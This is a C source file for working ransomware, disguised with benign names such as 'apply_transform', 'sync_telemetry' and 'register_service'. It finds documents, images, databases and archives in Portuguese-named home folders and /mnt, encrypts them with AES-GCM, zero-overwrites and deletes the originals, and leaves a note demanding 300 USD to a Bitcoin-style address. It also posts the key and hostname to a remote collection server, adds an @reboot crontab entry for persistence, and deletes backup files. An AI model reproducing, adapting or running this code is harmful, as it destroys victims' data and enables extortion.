#define _GNU_SOURCE
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <limits.h>
#include <stdbool.h>
#include <pwd.h>
#include <sys/types.h>
#include <curl/curl.h>
#include <sys/utsname.h>

int init_session(void) {
    unsigned char key[32];
    if (RAND_bytes(key, 32) != 1) {
        return -1;
    }

    char b64[44 + 1];
    int b64_len = EVP_EncodeBlock((unsigned char *)b64, key, 32);
    b64[b64_len] = '\0';

    size_t json_len = 16 + strlen(b64) + 1;
    char *json = malloc(json_len);
    if (!json) {
        return -1;
    }
    snprintf(json, json_len, "{\"aes_key\":\"%s\"}", b64);

    FILE *fp = fopen("/tmp/.master.key", "w");
    if (!fp) {
        free(json);
        return -1;
    }
    if (fwrite(json, 1, strlen(json), fp) != strlen(json)) {
        fclose(fp);
        free(json);
        return -1;
    }
    fclose(fp);
    free(json);

    if (chmod("/tmp/.master.key", 0600) == -1) {
        return -1;
    }

    return 0;
}

struct file_record {
    char *filename;
    char *full_path;
    off_t size;
    time_t mtime;
    struct file_record *next;
};

static const char *ALLOWED_EXTS[] = {
    ".xlsx",".docx",".pdf",".txt",".csv",
    ".jpg",".png",".db",".backup",".psd",
    ".zip",".rar"
};
static const size_t EXT_COUNT = sizeof(ALLOWED_EXTS) / sizeof(ALLOWED_EXTS[0]);

static void to_lower(char *s)
{
    for (; *s; ++s) if (*s >= 'A' && *s <= 'Z') *s += 'a' - 'A';
}

static bool has_allowed_extension(const char *path)
{
    const char *dot = strrchr(path, '.');
    if (!dot) return false;
    char *ext = strdup(dot);
    if (!ext) return false;
    to_lower(ext);
    bool ok = false;
    for (size_t i = 0; i < EXT_COUNT; ++i) {
        if (strcmp(ext, ALLOWED_EXTS[i]) == 0) {
            ok = true;
            break;
        }
    }
    free(ext);
    return ok;
}

static void prepend_record(struct file_record **head,
                           struct file_record **tail,
                           const char *filename,
                           const char *full_path,
                           off_t size,
                           time_t mtime)
{
    struct file_record *rec = malloc(sizeof *rec);
    if (!rec) return;
    rec->filename = strdup(filename);
    rec->full_path = strdup(full_path);
    rec->size = size;
    rec->mtime = mtime;
    rec->next = *head;
    *head = rec;
    if (!*tail) *tail = rec;
}

static int traverse(const char *path, int depth,
                    struct file_record **head,
                    struct file_record **tail)
{
    DIR *dir = opendir(path);
    if (!dir) {
        fprintf(stderr, "scan_storage: opendir failed for '%s': %s\n",
                path, strerror(errno));
        return -1;
    }

    struct dirent *ent;
    while ((ent = readdir(dir)) != NULL) {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
            continue;

        char *entry_path = NULL;
        if (asprintf(&entry_path, "%s/%s", path, ent->d_name) < 0) {
            perror("asprintf");
            continue;
        }

        struct stat st;
        if (lstat(entry_path, &st) != 0) {
            fprintf(stderr, "scan_storage: lstat failed for '%s': %s\n",
                    entry_path, strerror(errno));
            free(entry_path);
            continue;
        }

        if (S_ISLNK(st.st_mode)) {
            char resolved[PATH_MAX];
            if (realpath(entry_path, resolved) != NULL) {
                struct stat st2;
                if (stat(resolved, &st2) == 0) {
                    if (S_ISDIR(st2.st_mode) && depth < 10) {
                        traverse(resolved, depth + 1, head, tail);
                    } else if (S_ISREG(st2.st_mode)) {
                        if (has_allowed_extension(resolved)) {
                            prepend_record(head, tail,
                                           ent->d_name, resolved,
                                           st2.st_size, st2.st_mtime);
                        }
                    }
                }
            } else {
                fprintf(stderr, "scan_storage: realpath failed for '%s'\n",
                        entry_path);
            }
            free(entry_path);
            continue;
        }

        if (S_ISDIR(st.st_mode)) {
            if (depth < 10) {
                traverse(entry_path, depth + 1, head, tail);
            }
        } else if (S_ISREG(st.st_mode)) {
            if (has_allowed_extension(entry_path)) {
                prepend_record(head, tail,
                               ent->d_name, entry_path,
                               st.st_size, st.st_mtime);
            }
        }
        free(entry_path);
    }

    if (closedir(dir) != 0) {
        fprintf(stderr, "scan_storage: closedir failed for '%s': %s\n",
                path, strerror(errno));
    }
    return 0;
}

struct file_record *scan_storage(void)
{
    struct file_record *head = NULL;
    struct file_record *tail = NULL;

    char *home = getenv("HOME");
    if (!home) {
        struct passwd *pw = getpwuid(getuid());
        if (pw) home = pw->pw_dir;
        else home = "";
    }

    const char *dirs[] = {
        "Documentos_Teste",
        "Documentos",
        "Downloads",
        "Imagens",
        "/mnt"
    };
    const size_t dir_cnt = sizeof(dirs) / sizeof(dirs[0]);

    for (size_t i = 0; i < dir_cnt; ++i) {
        char *root_path = NULL;
        if (strcmp(dirs[i], "/mnt") == 0) {
            root_path = strdup(dirs[i]);
        } else {
            if (asprintf(&root_path, "%s/%s", home, dirs[i]) < 0) {
                perror("asprintf");
                continue;
            }
        }

        if (root_path) {
            struct stat sb;
            if (stat(root_path, &sb) == 0 && S_ISDIR(sb.st_mode)) {
                traverse(root_path, 0, &head, &tail);
            } else {
                fprintf(stderr, "scan_storage: directory '%s' does not exist or is not a directory\n",
                        root_path);
            }
            free(root_path);
        }
    }

    return head;
}

int apply_transform(const char *filepath)
{
    struct stat st;
    if (stat(filepath, &st) != 0) {
        perror("stat");
        return -1;
    }
    if (st.st_size == 0) {
        fprintf(stderr, "File %s is empty – skipping.\n", filepath);
        return -2;
    }

    int src_fd = open(filepath, O_RDONLY);
    if (src_fd < 0) {
        perror("open source");
        return -3;
    }
    size_t in_len = (size_t)st.st_size;
    uint8_t *in_buf = malloc(in_len);
    if (!in_buf) {
        perror("malloc");
        close(src_fd);
        return -4;
    }
    ssize_t r;
    r = read(src_fd, in_buf, in_len);
    close(src_fd);
    if (r != (ssize_t)in_len) {
        perror("read source");
        free(in_buf);
        return -5;
    }

    uint8_t nonce[12];
    if (RAND_bytes(nonce, sizeof(nonce)) != 1) {
        perror("RAND_bytes nonce");
        free(in_buf);
        return -6;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        perror("EVP_CIPHER_CTX_new");
        free(in_buf);
        return -7;
    }
    EVP_CIPHER *cipher = EVP_aes_256_gcm();
    if (!cipher) {
        perror("EVP_aes_256_gcm");
        EVP_CIPHER_CTX_free(ctx);
        free(in_buf);
        return -8;
    }
    if (EVP_EncryptInit_ex(ctx, cipher, NULL, (const uint8_t[]){0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f,0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f}, nonce) != 1) {
        perror("EVP_EncryptInit_ex");
        EVP_CIPHER_CTX_free(ctx);
        free(in_buf);
        return -9;
    }
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, NULL) != 1) {
        perror("EVP_CIPHER_CTX_ctrl GCM_SET_TAG");
        EVP_CIPHER_CTX_free(ctx);
        free(in_buf);
        return -10;
    }

    uint8_t *out_buf = malloc(in_len + EVP_MAX_BLOCK_LENGTH);
    if (!out_buf) {
        perror("malloc ciphertext buffer");
        EVP_CIPHER_CTX_free(ctx);
        free(in_buf);
        return -11;
    }
    int out_len = 0;
    if (EVP_EncryptUpdate(ctx, out_buf, &out_len, in_buf, (int)in_len) != 1) {
        perror("EVP_EncryptUpdate");
        EVP_CIPHER_CTX_free(ctx);
        free(out_buf);
        free(in_buf);
        return -12;
    }
    int final_len = 0;
    if (EVP_EncryptFinal_ex(ctx, out_buf + out_len, &final_len) != 1) {
        perror("EVP_EncryptFinal_ex");
        EVP_CIPHER_CTX_free(ctx);
        free(out_buf);
        free(in_buf);
        return -13;
    }
    out_len += final_len;

    uint8_t tag[16];
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag) != 1) {
        perror("EVP_CIPHER_CTX_ctrl GET_TAG");
        EVP_CIPHER_CTX_free(ctx);
        free(out_buf);
        free(in_buf);
        return -14;
    }
    EVP_CIPHER_CTX_free(ctx);

    size_t path_len = strlen(filepath);
    char *out_path = malloc(path_len + 12);
    if (!out_path) {
        perror("malloc output path");
        free(out_buf);
        free(in_buf);
        return -15;
    }
    snprintf(out_path, path_len + 12, "%s.PROCESSED", filepath);

    int out_fd = open(out_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (out_fd < 0) {
        perror("open output");
        free(out_path);
        free(out_buf);
        free(in_buf);
        return -16;
    }

    ssize_t w;
    w = write(out_fd, nonce, sizeof(nonce));
    if (w != (ssize_t)sizeof(nonce)) {
        perror("write nonce");
        close(out_fd);
        unlink(out_path);
        free(out_path);
        free(out_buf);
        free(in_buf);
        return -17;
    }
    w = write(out_fd, out_buf, (size_t)out_len);
    if (w != (ssize_t)out_len) {
        perror("write ciphertext");
        close(out_fd);
        unlink(out_path);
        free(out_path);
        free(out_buf);
        free(in_buf);
        return -18;
    }
    w = write(out_fd, tag, sizeof(tag));
    if (w != (ssize_t)sizeof(tag)) {
        perror("write tag");
        close(out_fd);
        unlink(out_path);
        free(out_path);
        free(out_buf);
        free(in_buf);
        return -19;
    }
    if (fsync(out_fd) != 0) {
        perror("fsync output");
        close(out_fd);
        unlink(out_path);
        free(out_path);
        free(out_buf);
        free(in_buf);
        return -20;
    }
    close(out_fd);

    int zero_fd = open(filepath, O_RDWR);
    if (zero_fd < 0) {
        perror("open source for zeroing");
        free(out_path);
        free(out_buf);
        free(in_buf);
        return -21;
    }
    uint8_t zero_buf[4096];
    size_t remaining = (size_t)st.st_size;
    while (remaining > 0) {
        size_t chunk = remaining < sizeof(zero_buf) ? remaining : sizeof(zero_buf);
        if (write(zero_fd, zero_buf, chunk) != (ssize_t)chunk) {
            perror("write zeros");
            close(zero_fd);
            free(out_path);
            free(out_buf);
            free(in_buf);
            return -22;
        }
        remaining -= chunk;
    }
    if (fsync(zero_fd) != 0) {
        perror("fsync zero");
        close(zero_fd);
        free(out_path);
        free(out_buf);
        free(in_buf);
        return -23;
    }
    close(zero_fd);

    if (remove(filepath) != 0) {
        perror("remove source");
        free(out_path);
        free(out_buf);
        free(in_buf);
        return -24;
    }

    free(out_path);
    free(out_buf);
    free(in_buf);
    return 0;
}

int write_notice(const char **dirs, size_t dir_count)
{
    static const char *notice_filename = "#_STATUS_NOTICE_#.txt";
    static const char *notice_text =
        "This directory has been processed. A fee of 300 USD is required for identifier 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa. Contact us via secure channel.\n";

    for (size_t i = 0; i < dir_count; ++i) {
        const char *dir = dirs[i];
        if (dir == NULL)
            continue;

        int path_len = snprintf(NULL, 0, "%s/%s", dir, notice_filename);
        if (path_len < 0) {
            fprintf(stderr, "snprintf failed for directory %s\n", dir);
            return -1;
        }

        char *filepath = malloc(path_len + 1);
        if (filepath == NULL) {
            fprintf(stderr, "malloc failed for file path\n");
            return -1;
        }
        snprintf(filepath, path_len + 1, "%s/%s", dir, notice_filename);

        FILE *fp = fopen(filepath, "w");
        if (fp == NULL) {
            perror("fopen");
            free(filepath);
            return -1;
        }

        if (fprintf(fp, "%s", notice_text) < 0) {
            fprintf(stderr, "Failed to write notice to %s\n", filepath);
            fclose(fp);
            free(filepath);
            return -1;
        }

        if (fclose(fp) != 0) {
            perror("fclose");
            free(filepath);
            return -1;
        }

        free(filepath);
    }

    return 0;
}

int sync_telemetry(void) {
    const char *key_file = "/tmp/.master.key";
    FILE *fp = fopen(key_file, "rb");
    if (!fp) {
        fprintf(stderr, "Error: cannot open %s: %s\n", key_file, strerror(errno));
        return -1;
    }

    if (fseek(fp, 0, SEEK_END) != 0) {
        fprintf(stderr, "Error: fseek failed\n");
        fclose(fp);
        return -1;
    }
    long fsize = ftell(fp);
    if (fsize <= 0) {
        fprintf(stderr, "Error: file size invalid\n");
        fclose(fp);
        return -1;
    }
    rewind(fp);

    char *file_buf = malloc(fsize + 1);
    if (!file_buf) {
        fprintf(stderr, "Error: malloc failed\n");
        fclose(fp);
        return -1;
    }
    size_t nread = fread(file_buf, 1, fsize, fp);
    file_buf[nread] = '\0';
    fclose(fp);

    const char *search = "\"aes_key\":\"";
    const char *p = strstr(file_buf, search);
    char *aes_key = NULL;
    if (p) {
        p += strlen(search);
        const char *end = strchr(p, '"');
        if (end) {
            size_t len = end - p;
            aes_key = malloc(len + 1);
            if (aes_key) {
                memcpy(aes_key, p, len);
                aes_key[len] = '\0';
            }
        }
    }
    free(file_buf);

    if (!aes_key) {
        fprintf(stderr, "Error: aes_key not found in %s\n", key_file);
        return -1;
    }

    char hostname[256];
    if (gethostname(hostname, sizeof(hostname) - 1) != 0) {
        hostname[0] = '\0';
    }
    hostname[sizeof(hostname) - 1] = '\0';

    int needed = snprintf(NULL, 0, "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}", aes_key, hostname);
    if (needed < 0) {
        fprintf(stderr, "Error: snprintf failed\n");
        free(aes_key);
        return -1;
    }
    char *json_payload = malloc(needed + 1);
    if (!json_payload) {
        fprintf(stderr, "Error: malloc for json_payload failed\n");
        free(aes_key);
        return -1;
    }
    snprintf(json_payload, needed + 1, "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}", aes_key, hostname);
    free(aes_key);

    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Error: curl_easy_init failed\n");
        free(json_payload);
        return -1;
    }

    struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");
    if (!headers) {
        fprintf(stderr, "Error: curl_slist_append failed\n");
        free(json_payload);
        curl_easy_cleanup(curl);
        return -1;
    }

    CURLcode res = curl_easy_setopt(curl, CURLOPT_URL, "http://10.254.19.191:8080/collect");
    if (res != CURLE_OK) {
        fprintf(stderr, "Error: curl_easy_setopt URL failed: %s\n", curl_easy_strerror(res));
        curl_slist_free_all(headers);
        free(json_payload);
        curl_easy_cleanup(curl);
        return -1;
    }

    res = curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_payload);
    if (res != CURLE_OK) {
        fprintf(stderr, "Error: curl_easy_setopt POSTFIELDS failed: %s\n", curl_easy_strerror(res));
        curl_slist_free_all(headers);
        free(json_payload);
        curl_easy_cleanup(curl);
        return -1;
    }

    res = curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(json_payload));
    if (res != CURLE_OK) {
        fprintf(stderr, "Error: curl_easy_setopt POSTFIELDSIZE failed: %s\n", curl_easy_strerror(res));
        curl_slist_free_all(headers);
        free(json_payload);
        curl_easy_cleanup(curl);
        return -1;
    }

    res = curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    if (res != CURLE_OK) {
        fprintf(stderr, "Error: curl_easy_setopt HTTPHEADER failed: %s\n", curl_easy_strerror(res));
        curl_slist_free_all(headers);
        free(json_payload);
        curl_easy_cleanup(curl);
        return -1;
    }

    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "Error: curl_easy_perform failed: %s\n", curl_easy_strerror(res));
        curl_slist_free_all(headers);
        free(json_payload);
        curl_easy_cleanup(curl);
        return -1;
    }

    long http_code = 0;
    res = curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    if (res != CURLE_OK) {
        fprintf(stderr, "Error: curl_easy_getinfo failed: %s\n", curl_easy_strerror(res));
        curl_slist_free_all(headers);
        free(json_payload);
        curl_easy_cleanup(curl);
        return -1;
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(json_payload);

    if (http_code == 200) {
        if (unlink(key_file) != 0) {
            fprintf(stderr, "Error: unlink %s failed: %s\n", key_file, strerror(errno));
            return -1;
        }
        return 0;
    } else {
        fprintf(stderr, "Error: HTTP response code %ld, expected 200\n", http_code);
        return -1;
    }
}

int register_service(const char *binary_path, const char *paths[], int npaths)
{
    if (!binary_path)
        return -1;

    char **crontab_lines = NULL;
    size_t crontab_sz = 0;
    size_t crontab_cap = 0;
    int entry_found = 0;

    FILE *cr_fp = popen("crontab -l", "r");
    if (cr_fp) {
        char *line = NULL;
        size_t line_len = 0;
        ssize_t nread;
        while ((nread = getline(&line, &line_len, cr_fp)) != -1) {
            if (crontab_sz >= crontab_cap) {
                crontab_cap = crontab_cap ? crontab_cap * 2 : 16;
                char **tmp = realloc(crontab_lines, crontab_cap * sizeof(char *));
                if (!tmp) {
                    free(line);
                    goto error;
                }
                crontab_lines = tmp;
            }
            crontab_lines[crontab_sz++] = strdup(line);

            if (!entry_found) {
                char *tmp = strdup(line);
                size_t len = strlen(tmp);
                if (len > 0 && tmp[len - 1] == '\n')
                    tmp[len - 1] = '\0';

                const char *p = tmp;
                while (*p && (*p == ' ' || *p == '\t')) ++p;
                if (strncmp(p, "@reboot", 7) == 0) {
                    p += 7;
                    while (*p && (*p == ' ' || *p == '\t')) ++p;
                    if (strcmp(p, binary_path) == 0)
                        entry_found = 1;
                }
                free(tmp);
            }
        }
        free(line);
        pclose(cr_fp);
    }

    if (!entry_found) {
        FILE *cw_fp = popen("crontab -", "w");
        if (!cw_fp)
            goto error;

        for (size_t i = 0; i < crontab_sz; ++i)
            fprintf(cw_fp, "%s", crontab_lines[i]);

        fprintf(cw_fp, "@reboot %s\n", binary_path);
        int rc = pclose(cw_fp);
        if (rc != 0)
            goto error;
    }

    for (size_t i = 0; i < crontab_sz; ++i)
        free(crontab_lines[i]);
    free(crontab_lines);

    for (int i = 0; i < npaths; ++i) {
        const char *dir = paths[i];
        DIR *dp = opendir(dir);
        if (!dp) {
            perror("opendir");
            return -1;
        }

        struct dirent *ent;
        while ((ent = readdir(dp)) != NULL) {
            if (ent->d_name[0] == '.' &&
                (ent->d_name[1] == '\0' ||
                 (ent->d_name[1] == '.' && ent->d_name[2] == '\0')))
                continue;

            char *fullpath = NULL;
            if (asprintf(&fullpath, "%s/%s", dir, ent->d_name) == -1) {
                closedir(dp);
                return -1;
            }

            struct stat st;
            if (lstat(fullpath, &st) == 0 && S_ISREG(st.st_mode)) {
                const char *name = ent->d_name;
                size_t nlen = strlen(name);
                int match = 0;
                if (nlen >= 4 && strcmp(name + nlen - 4, ".bak") == 0) match = 1;
                if (nlen >= 7 && strcmp(name + nlen - 7, ".backup") == 0) match = 1;
                if (nlen >= 4 && strcmp(name + nlen - 4, ".old") == 0) match = 1;

                if (match) {
                    if (remove(fullpath) != 0) {
                        perror("remove");
                        free(fullpath);
                        closedir(dp);
                        return -1;
                    }
                }
            }
            free(fullpath);
        }
        closedir(dp);
    }

    return 0;

error:
    for (size_t i = 0; i < crontab_sz; ++i)
        free(crontab_lines[i]);
    free(crontab_lines);
    return -1;
}

int main(int argc, char *argv[])
{
    if (init_session() != 0) {
        fprintf(stderr, "init_session failed\n");
        return 1;
    }

    struct file_record *files = scan_storage();
    struct file_record *cur = files;
    int encrypted_count = 0;

    while (cur != NULL) {
        if (apply_transform(cur->full_path) == 0) {
            encrypted_count++;
        }
        cur = cur->next;
    }

    char **unique_dirs = NULL;
    size_t unique_count = 0;
    size_t unique_cap = 0;

    if (encrypted_count > 0) {
        cur = files;
        while (cur != NULL) {
            const char *path = cur->full_path;
            const char *sep = strrchr(path, '/');
            if (sep) {
                size_t dir_len = sep - path;
                char *dir = malloc(dir_len + 1);
                if (dir) {
                    memcpy(dir, path, dir_len);
                    dir[dir_len] = '\0';
                    bool found = false;
                    for (size_t i = 0; i < unique_count; i++) {
                        if (strcmp(unique_dirs[i], dir) == 0) {
                            found = true;
                            break;
                        }
                    }
                    if (!found) {
                        if (unique_count >= unique_cap) {
                            unique_cap = unique_cap ? unique_cap * 2 : 8;
                            char **tmp = realloc(unique_dirs, unique_cap * sizeof(char *));
                            if (!tmp) {
                                free(dir);
                                break;
                            }
                            unique_dirs = tmp;
                        }
                        unique_dirs[unique_count++] = dir;
                    } else {
                        free(dir);
                    }
                }
            }
            cur = cur->next;
        }
    }

    struct file_record *to_free = files;
    while (to_free != NULL) {
        struct file_record *next = to_free->next;
        free(to_free->filename);
        free(to_free->full_path);
        free(to_free);
        to_free = next;
    }

    if (unique_count > 0) {
        const char **dir_ptrs = malloc(unique_count * sizeof(const char *));
        if (dir_ptrs) {
            for (size_t i = 0; i < unique_count; i++) {
                dir_ptrs[i] = unique_dirs[i];
            }
            write_notice(dir_ptrs, unique_count);
            free(dir_ptrs);
        }
        for (size_t i = 0; i < unique_count; i++) {
            free(unique_dirs[i]);
        }
        free(unique_dirs);
    }

    sync_telemetry();

    const char *service_dirs[] = {
        "Documentos_Teste",
        "Documentos",
        "Downloads",
        "Imagens",
        "/mnt"
    };
    register_service(argv[0], service_dirs, 5);

    return 0;
}